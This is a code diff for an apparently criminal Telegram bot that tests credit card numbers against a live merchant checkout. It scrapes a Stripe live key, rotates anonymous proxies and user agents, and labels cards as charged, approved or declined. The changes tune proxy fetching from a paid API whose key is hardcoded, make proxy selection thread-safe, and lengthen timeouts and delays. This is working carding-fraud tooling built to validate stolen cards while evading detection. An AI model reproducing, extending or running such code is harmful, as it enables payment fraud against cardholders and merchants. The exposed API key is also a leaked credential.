@@ -43,30 +43,22 @@ USER_AGENTS = [
 
 def fetch_good_proxies(chat_id):
     global proxies_list
-    bot.send_message(chat_id, "🔄 Fetching elite proxies... (Option 6)")
-    sources = [
-        "https://api.good-proxies.ru/api?key=3269305ce8094af10e5933fe67db8529&ping=3000&time=300&anon=elite&access=supportsHttps",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
-    ]
-    all_proxies = []
-    for url in sources:
-        try:
-            r = requests.get(url, timeout=12, headers={'User-Agent': 'Mozilla/5.0'})
-            if r.status_code == 200:
-                new_p = [line.strip() for line in r.text.splitlines() if ':' in line and len(line.strip()) > 5]
-                all_proxies.extend(new_p)
-                bot.send_message(chat_id, f"✅ Loaded {len(new_p)} from source")
-        except:
-            continue
-    if all_proxies:
-        proxies_list = list(dict.fromkeys(all_proxies))
-        bot.send_message(chat_id, f"✅ **SUCCESS** - Total {len(proxies_list)} elite proxies loaded!")
-        return True
-    else:
-        bot.send_message(chat_id, "⚠️ All sources failed. Try Option 1-5 manually.")
-        return False
+    bot.send_message(chat_id, "🔄 Nag-download og bag-ong elite proxies (Very Fast)...")
+    try:
+        url = "https://api.good-proxies.ru/api"
+        params = {'key': "3269305ce8094af10e5933fe67db8529", 'ping': "3000", 'time': "300", 'anon': "elite", 'access': "supportsHttps"}
+        headers = {'User-Agent': "okhttp/4.10.0"}
+        response = requests.get(url, params=params, headers=headers, timeout=15)
+        if response.status_code == 200:
+            new_proxies = [line.strip() for line in response.text.splitlines() if line.strip() and ':' in line]
+            if new_proxies:
+                proxies_list = new_proxies
+                bot.send_message(chat_id, f"✅ **VERY FAST** - Nakarga {len(proxies_list)} elite proxies!")
+                return True
+    except:
+        pass
+    bot.send_message(chat_id, "⚠️ Wala makakuha proxies.")
+    return False
 
 def get_bin_info(bin_code):
     try:
@@ -129,8 +121,8 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
             "upgrade-insecure-requests": "1",
             "user-agent": random.choice(USER_AGENTS),
         }
-        session.get(BUY_URL, headers=headers, timeout=15)
-        html = session.get(BUY_URL, headers=headers, timeout=15).text
+        session.get(BUY_URL, headers=headers, timeout=20)
+        html = session.get(BUY_URL, headers=headers, timeout=20).text
         pk_live = None
         m = re.search(r"pk_live_[A-Za-z0-9]+", html)
         if m: pk_live = m.group(0)
@@ -352,16 +344,20 @@ def worker(cc_line, use_proxy=False, proxy_type="http", chat_id=None):
     attempt = 0
     while True:
         attempt += 1
-        proxy = random.choice(proxies_list) if use_proxy and proxies_list else None
+        proxy = None
+        if use_proxy and proxies_list:
+            with proxy_lock:
+                proxy = random.choice(proxies_list)
         status, response, brand_auto = check_cc(cc_line, proxy, proxy_type)
         if status in ["CHARGED", "APPROVED", "DECLINED"]:
             break
-        time.sleep(random.uniform(0.3, 0.8))
+        time.sleep(random.uniform(0.5, 1.5))
     bin_code = cc_line[:6]
     brand_bin, bank, country, flag = get_bin_info(bin_code)
     brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
     if status == "CHARGED": stats["charged"] += 1
     elif status == "APPROVED": stats["approved"] += 1
+    elif status == "ERROR": stats["error"] += 1
     else: stats["declined"] += 1
     block = build_block(cc_line, status, response, brand, bank, country, flag)
     if chat_id:
